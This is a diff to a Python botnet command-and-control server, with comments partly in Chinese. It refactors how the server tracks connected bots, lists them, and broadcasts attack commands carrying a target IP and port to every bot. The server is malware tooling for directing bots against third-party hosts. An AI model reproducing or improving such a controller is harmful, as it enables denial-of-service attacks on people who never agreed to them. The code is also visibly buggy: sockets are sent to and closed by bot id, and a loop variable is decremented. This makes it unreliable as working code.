@@ -11,8 +11,6 @@ class netbot:
         self.is_start = is_start
         self.ip_address = ip_address
 
-netbots: List[netbot] = []
-
 class Server:
     def __init__(self):
         self.socketfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -63,23 +61,23 @@ class Server:
         
     def start_attack(self):
         if(self.attack != "None" and self.target_ip != "None" and self.target_port != 0):
-            for netbot in netbots:
+            for netbot in self.netbots:
                 if self.attack == "HALT":
                     message = self.attack
                 else:
                     message = f"{self.attack}_{self.target_ip}_{self.target_port}"
 
-                socketfd.send(netbot.id, message.encode(), len(message),0)
+                self.socketfd.send(netbot.id, message.encode(), len(message),0)
 
     def close_connected_sockets(self):
-        for netbot in netbots:
-            socketfd.close(netbot.id)
+        for netbot in self.netbots:
+            self.socketfd.close(netbot.id)
     
     def list_bots(self):
         os.system("clear")
-        print(f"\n\nBots connected ({len(netbots)}):\n")
+        print(f"\n\nBots connected ({len(self.netbots)}):\n")
 
-        for bot in netbots:
+        for bot in self.netbots:
             print(f"bot: {bot.ip_address}")
         
         print("\nPress any key to exit...")
@@ -132,7 +130,7 @@ class Server:
             if int_choice in [1, 2, 3, 4, 5, 6]:
                 break
         
-    def threaded(i):
+    def threaded(self, i):
         buffer = bytearray(1024)
         try:
             while True:
@@ -140,10 +138,10 @@ class Server:
                 if bytes_received == 0: # 客户端断开连接
                     # 查找并删除netbot
                     bot = None
-                    for netbot in netbots:
+                    for netbot in self.netbots:
                         if netbot.id == i:
                             bot = netbot
-                            netbots.remove(netbot)
+                            self.netbots.remove(netbot)
                             netbot -= 1
 
                     print(f"\nNetbot ({bot.ip_address}) disconnected.", flush=True)
@@ -158,19 +156,19 @@ class Server:
             print(f"Error: {e}", flush=True)
             i.close()
     
-    def connection_listener(i):
-        while len(netbots) != 10:
+    def connection_listener(self, i):
+        while len(self.netbots) != 10:
             client_socket, client_address = i.accept()
             client_ip = client_address[0]
-            print(f"Client connected: {client_ip}\tTotal Bots Connected: {len(netbots)}")
+            print(f"Client connected: {client_ip}\tTotal Bots Connected: {len(self.netbots)}")
 
             # 将客户端信息添加到netbots列表
             netbot = netbot(id = client_socket.fileno(), start = time.time(), ip_address = client_ip)
-            netbots.append(netbot)
+            self.netbots.append(netbot)
 
             # 创建并启动
-            thread = threading.Thread(target=threaded, args=(client_socket,))
+            thread = threading.Thread(target=self.threaded, args=(client_socket,))
             thread.daemon = True # 设置为守护线程
-            thread.append(thread)
+            self.threads.append(thread)
             thread.start()    
     
